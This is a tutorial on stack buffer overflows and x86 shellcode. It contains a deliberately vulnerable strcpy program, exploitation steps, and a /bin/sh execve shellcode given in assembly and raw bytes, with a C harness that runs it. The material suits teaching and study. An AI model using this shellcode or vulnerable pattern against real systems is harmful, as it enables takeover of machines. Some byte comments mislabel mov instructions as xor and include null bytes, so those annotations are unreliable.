# Shellcodes 

## 1. Stack Buffer-overflow Bugs

### Example of Vulnerable Code:

```c
#include <stdio.h>
#include <string.h>

void foo(char *str) {
    char buffer[8];
    strcpy(buffer, str); // vulnerable function!
}

int main(int argc, char **argv) {
    if (argc < 2) return 1;
    foo(argv[1]);
    puts("Everything is fine!");
    return 0;
}
```

#### Buffer Overflow Example:

```bash
./vulnerable $(python -c 'print("A"*14)')
Segmentation fault
```

- **Why?** Overflow overwrites `saved eip`.

---

## 2. Unsafe Libc Functions (Commonly Exploitable):

| Function      | Safer Alternative |
|---------------|-------------------|
| `gets()`      | `fgets()`         |
| `strcpy()`    | `strncpy()`       |
| `strcat()`    | `strncat()`       |
| `sprintf()`   | `snprintf()`      |

---

## 3. Exploitation Process:

**Steps to Exploit a Buffer Overflow:**

1. Control execution flow (overwrite EIP).
2. Inject shellcode (payload).
3. Use NOP-sled (`0x90`) to improve reliability.

#### Classic Stack Layout:

```
[Buffer | NOP-sled | Shellcode | saved ebp | saved eip]
```

---

## 4. Shellcode Basics

**Definition**: Small pieces of code injected into memory to execute arbitrary commands or control the compromised system.

### Important Properties:

- **Small**: To fit into buffer overflow limits.
- **Position-Independent Code (PIC)**: Must not rely on absolute memory addresses.

---

## 5. Shellcode Taxonomy

### Context:
- **Local**: Exploited locally.
- **Remote**: Exploited remotely.

### Purpose:
- **Shell spawning**
- **Socket binding**
- **File writing**

### Operation Mode:
- Single-staged
- Multi-staged
- Egg-hunt
- Download & Execute

### Encoding:
- Null-free, newline-free
- Alphanumeric
- Encrypted

---

## 6. How to Build a Shellcode:

### Step-by-Step:

1. **Plan logic in C**  
   - Clearly outline desired operations.

2. **Translate to Assembly**  
   - Use syscalls directly.

3. **Ensure Position Independence**  
   - No hardcoded addresses; use relative addressing techniques.

4. **Convert to Opcodes**  
   - Assemble to machine code.

5. **Remove Forbidden Characters**  
   - Avoid null bytes (`0x00`) and other control characters.

---

## 7. Practical Example: Spawning a Shell (`/bin/sh`)

### C Logic:

```c
#include <unistd.h>
int main() {
    char *shell = "/bin/sh";
    execve(shell, NULL, NULL);
    return 0;
}
```

### Assembly Translation:

```assembly
_start:
    xor %edx, %edx
    xor %ecx, %ecx
    mov $shell, %ebx
    mov $0xb, %eax
    int $0x80       ; execve syscall
    xor %ebx, %ebx
    mov $0x1, %eax
    int $0x80       ; exit syscall
shell:
    .string "/bin/sh"
```

### Ensuring Position Independence (Jump-Call-Pop):

```assembly
_start:
    jmp short string
return:
    pop ebx
    xor eax, eax
    mov al, 0xb
    xor ecx, ecx
    xor edx, edx
    int 0x80

string:
    call return
    .string "/bin/sh"
```

### Getting Shellcode Opcodes:

Use:
```bash
objdump -d shell
```

or compile as binary:
```bash
as --32 -o shell.o shell.s
ld --oformat binary -m elf_i386 -o shell shell.o
xxd shell
```

---

## 8. Running Shellcode from C

Stack must be executable:

```c
#include <stdlib.h>

int main() {
    char shellcode[] =
        "\xeb\x1e"         // jmp forward
        "\x5b"             // pop ebx
        "\xba\x00\x00\x00\x00" // xor edx, edx
        "\xb9\x00\x00\x00\x00" // xor ecx, ecx
        "\xb8\x0b\x00\x00\x00" // mov 11, eax (execve)
        "\xcd\x80"         // int 0x80
        "\xbb\x00\x00\x00\x00" // xor ebx, ebx
        "\xb8\x01\x00\x00\x00" // mov 1, eax (exit)
        "\xcd\x80"         // int 0x80
        "\xe8\xdd\xff\xff\xff" // call backwards
        "/bin/sh";

    (*(void(*)()) shellcode)();

    return EXIT_SUCCESS;
}
```

Compile with executable stack:
```bash
gcc -m32 -zexecstack -o shell shell.c
```
